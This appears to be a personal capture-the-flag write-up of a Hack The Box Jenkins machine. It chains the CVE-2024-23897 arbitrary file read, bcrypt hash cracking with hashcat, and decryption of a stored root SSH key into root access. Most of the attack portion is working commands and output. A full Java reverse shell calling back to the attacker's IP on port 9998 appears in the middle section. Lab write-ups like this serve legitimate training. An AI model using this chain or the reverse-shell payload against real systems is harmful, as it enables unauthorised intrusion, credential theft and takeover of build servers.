https://www.hackthebox.com/achievement/machine/1777380/591

1-Discover Jenkins Instance
2-Exploit CVE-2024-23897  (Arbitrary File Read)
3-Target specific Jenkins directories to extract credentials:
- `/var/jenkins_home/users/` (User data)
- `/var/jenkins_home/secrets/` (Encryption secrets)
- `/var/jenkins_home/config.xml` (Usernames & password hashes)

4-Extract Jenkins Credentials
5-Jenkins Admin Panel Access
6-Extract Encrypted SSH Key
7-SSH into the machine
8-escalate privilege

---

## Enumeration
```bash
┌──(pwn㉿kali)-[~]
└─$ sudo nmap -sC -sV -p- -T4 10.10.11.10 
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 
8080/tcp open  http    Jetty 10.0.18
|_http-title: Dashboard [Jenkins]
|_http-server-header: Jetty(10.0.18)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
-Jenkins User ID: jennifer
-Jenkins 2.441
https://www.jenkins.io/security/advisory/2024-01-24/
https://www.jenkins.io/doc/book/managing/cli/#downloading-the-client

```bash
wget http://10.10.11.10:8080/jnlpJars/jenkins-cli.jar
```

```bash
Using the client

The general syntax for invoking the client is as follows:

java -jar jenkins-cli.jar [-s JENKINS_URL] [global options...] command [command options...] [arguments...]
```

expandAtFiles:
When Jenkins sees an argument like `@/etc/passwd`, it reads the **contents** of that file and processes it as part of the command.

## Pre-exploitation

```
┌──(pwn㉿kali)-[~/builder]
└─$ java -jar jenkins-cli.jar -s http://10.10.11.10:8080 help      

```
-i should figure out how jenkins stores it files and where == path
-we may use docker it replicate the env without installation guide
```bash
/var/jenkins_home/users/username/config.xml
@/var/jenkins_home/users/admin_randomnumber/config.xml"
@/var/jenkins_home/users/users.xml"
to find the random for jennifer
there will be hash
as an exmaple
```

```bash
┌──(pwn㉿kali)-[~/builder]
└─$ java -jar jenkins-cli.jar -s http://10.10.11.10:8080 connect-node '@/var/jenkins_home/users/users.xml'

      <string>jennifer_12108429903186576833</string>: No such agent "      <string>jennifer_12108429903186576833</string>" 

```

```bash
@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml
```
---

```bash
┌──(pwn㉿kali)-[~/builder]
└─$ java -jar jenkins-cli.jar -s http://10.10.11.10:8080 connect-node '@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml'
```
-<passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>
```bash
┌──(pwn㉿kali)-[~/builder]
└─$ hashcat -m 3200 bcrypt_hash.txt /usr/share/wordlists/rockyou.txt

$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a:princess

```
CREDS:
jennifer : princess
-log in jenkins with creds
![[Pasted image 20250224160325.png]]

![[Pasted image 20250224162301.png]]

```bash
String host="10.10.14.5";
int port=9998;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

---
```bash
jenkins@0f52c222a4cc:/$ ls
ls
bin
boot
dev
etc
home
..
..


```
---

## Post-exploitation
![[Pasted image 20250224162549.png]]

user.txt pwned


---
```bash
jenkins@0f52c222a4cc:~$ cat credentials.xml

<username>root

<privateKey>{AQAAABAAAAowLrfCrZx9baWliwrtCiwCyztaYVoYdkPrn5qEEYDqj5frZLuo4qcqH61hjEUdZtkPiX6buY1J4YKYFziwyFA1wH/X5XHjUb8lUYkf/XSuDhR5tIpV..snip....KSM=}</privateKey>

```
-hudson.util. decryption

```bash
println( hudson.util.Secret.decrypt("{AQAAABAAAAowLrfCrZx9baWliwrtCiwCyztaYVoYdkPrn5qEEYDqj5frZLuo4qcqH61hjEUdZtkPiX6buY1J4YKYFziwyFA1wH/X5XHjUb8lUYkf/XSuDhR5tIpVWwkk7l1FTYwQQl/i5MOTww3b1QNzIAIv41KLKDgsq4WUAS5RBt4OZ7v410VZgsnip..............jkOhGTjc7pGAg2zl10O84PzXW1TkN2yD9YHgo9xYa8E2k6pYSpVxxYlRogfz9exupYVievBPkQnKo1Qoi15+eunzHKrxm3WQssFMcYCdYHlJtWCbgrKChsFys4oUE7iW0YQ0MsAdcg/hWuBX878aR+/3HsHaB1OTIcTxtaaMR8IMMaKSM=}") )
```
![[Pasted image 20250224164403.png]]

```bash
┌──(pwn㉿kali)-[~/builder]
└─$ sudo chmod 600 key

┌──(pwn㉿kali)-[~/builder]
└─$ sudo ssh -i key root@10.10.11.10

root@builder:~# cat root.txt 
2........................e57

```

![[Pasted image 20250224164607.png]]